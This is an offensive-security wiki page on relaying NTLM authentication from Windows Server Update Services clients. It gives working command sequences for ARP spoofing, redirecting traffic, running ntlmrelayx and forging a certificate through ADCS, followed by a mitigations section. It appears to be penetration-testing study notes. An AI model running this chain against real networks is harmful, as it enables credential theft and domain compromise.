---
title: WSUS Attacks — NTLM Relay
permalink: /wiki/concepts/wsus-attacks/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
redirect_from:
- /wiki/concepts/wsus-attacks/
---

**Category:** Credential Access / Lateral Movement
**MITRE ATT&CK:** T1557.001 — LLMNR/NBT-NS Poisoning and Relay (analogous); T1550.002 — Pass the Hash
**Related:** [Active Directory Attacks](/wiki/concepts/active-directory-attacks/), [Lateral Movement](/wiki/concepts/lateral-movement/), [Responder](/wiki/tools/responder/), [Impacket](/wiki/tools/impacket/)

## Overview
Windows Server Update Services (WSUS) is Microsoft's patch distribution platform — clients check in periodically over HTTP (port 8530) or HTTPS (port 8531) to fetch approved updates. By ARP-spoofing or DNS-spoofing WSUS clients on the local subnet, an attacker can intercept these authentication flows and relay machine account (and sometimes user account) NTLM hashes. Post-patch (KB4571756/KB4577041 — CVE-2020-1013), the Windows Update client uses machine accounts exclusively for the main check-in endpoints, but user hashes may still appear on the reporting endpoint.

WSUS is deprecated as of September 2024 (Windows Server 2025) but remains widely deployed.

## How WSUS Authentication Works

WSUS clients authenticate to two endpoints via SOAP POST:
- `ClientWebService/client.asmx` — fetches update approvals → **machine account auth**
- `ReportingWebService/reportingwebservice.asmx` — reports install results → **machine or user account auth**

Registry keys configuring WSUS (under `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate`):

| Key | Purpose |
|-----|---------|
| `WUServer` | URL where clients fetch updates |
| `WUStatusServer` | URL where clients report results |
| `DetectionFrequencyEnabled` | Enable custom check-in interval |
| `DetectionFrequency` | Hours between check-ins (default: 22) |

## Enumeration

### Unauthenticated — Port Scan
```bash
# Find WSUS servers
nmap -sSVC -Pn --open -p 8530,8531 -iL host_list.txt
```

### Unauthenticated — Traffic Sniffing
```bash
# Sniff WSUS HTTP traffic on subnet (ARP/DNS spoof + capture)
# wsusniff.py lists active WSUS clients
python3 wsusniff.py -i eth0

# Then target those clients for ARP spoofing
```

### Authenticated — SYSVOL / GPO Parsing
```bash
# MANSPIDER + wsuspider.sh parses Machine_Registry.pol files
# Extracts WUServer, WUStatusServer, UseWUServer
wsuspider.sh <domain> <user> <password>

# NetExec registry query
nxc smb <client_ip> -u <user> -p <pass> -M reg-query \
    -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"

# Or direct registry query on a compromised host
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
```

## HTTP Exploitation (Port 8530)

```bash
# 1. ARP spoof target WSUS client to redirect traffic to attacker
apt install dsniff
arpspoof -i ens33 -t <wsus_client_ip> <wsus_server_ip>

# 2. Redirect inbound 8530 to ntlmrelayx (same port works)
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530

# 3. Start ntlmrelayx (requires impacket PR #2034 for WSUS support)
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

# 4. Trigger immediate check-in on target (optional, avoids waiting 22hrs)
wuauclt.exe /detectnow     # On the WSUS client
# or: Settings → Windows Update → Check for Updates

# 5. Wait for auth — machine accounts (WIN10-CLIENT$) relayed to LDAP
# Available as SOCKS connections in ntlmrelayx socks list
```

## HTTPS Exploitation (Port 8531)

HTTPS exploitation requires a certificate trusted by WSUS clients. Obtain via ADCS if a template allows `Enrollee Supplies Subject`.

```bash
# 1. Find exploitable ADCS template
certipy find -u <user> -p <pass> -dc-ip <DC_IP> -enabled -json
# Parse output:
jq -r '.["Certificate Templates"][] | select(.["Enrollee Supplies Subject"] and .Enabled) | .["Template Name"]' certipy_output.json

# 2. Request certificate for WSUS server's FQDN
certipy req -u <user@domain> -p <pass> -ca <CA_NAME> -template <TEMPLATE> \
    -subject "CN=wsus.domain.com" -dns wsus.domain.com \
    -out wsus_cert.pfx -dc-ip <DC_IP>

# 3. Extract cert and key
openssl pkcs12 -in wsus_cert.pfx -nocerts -out wsus.key -nodes
openssl pkcs12 -in wsus_cert.pfx -clcerts -nokeys -out wsus.crt

# 4. ARP spoof (same as HTTP)
arpspoof -i ens33 -t <wsus_client_ip> <wsus_server_ip>

# 5. Redirect port 8531
iptables -t nat -A PREROUTING -p tcp --dport 8531 -j REDIRECT --to-ports 8531

# 6. Start ntlmrelayx with HTTPS support
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying \
    --http-port 8531 --https --certfile wsus.crt --keyfile wsus.key
```

## After Capturing Machine Account Hashes

Machine account NTLM hashes (`COMPUTERNAME$`) via LDAP relay can be used for:
- **RBCD (Resource-Based Constrained Delegation):** Add allowed delegation to machine account → impersonate any user to that machine
- **LDAP operations:** Enumerate, modify AD objects (depending on machine account permissions)
- **ADCS ESC8:** Relay machine account to ADCS HTTP enrollment → get certificate for the machine → authenticate as machine with Kerberos

## Cleanup
```bash
iptables -t nat -L PREROUTING --line-numbers   # list rules
iptables -t nat -D PREROUTING 1                # remove rule by number
```

## Mitigations
- **Enable HTTPS on WSUS** — prevents HTTP-based interception (but HTTPS still attackable with ADCS misconfig)
- **Audit ADCS templates** — restrict `Enrollee Supplies Subject` to necessary users/groups; run Certipy to find ESC templates
- **Enforce SMB signing** — limits relay targets
- **Enable LDAP signing + channel binding** — prevents LDAP relay
- **ARP/DNS spoofing prevention** — Dynamic ARP Inspection (DAI) on switches; DNSSEC

## Tools
- `wsusniff.py` / `wsuspider.sh` — github.com/Coontzy1/WSUScripts
- `ntlmrelayx.py` — impacket (requires PR #2034 for WSUS HTTPS)
- `Certipy` — ADCS enumeration and exploitation
- `arpspoof` — from dsniff suite
- `wsuks` — github.com/NeffIsBack/wsuks (malicious update delivery, different angle)
- `MANSPIDER` — GPO parsing for WSUS configuration

## References
- TrustedSec — "WSUS Is SUS: NTLM Relay Attacks in Plain Sight" (2025-09-12)
- GoSecure — "Abusing WSUS for NTLM Relaying" (2021)
- impacket PR #2034 — WSUS HTTPS relay support
- CVE-2020-1013 — original WSUS relay (GoSecure)
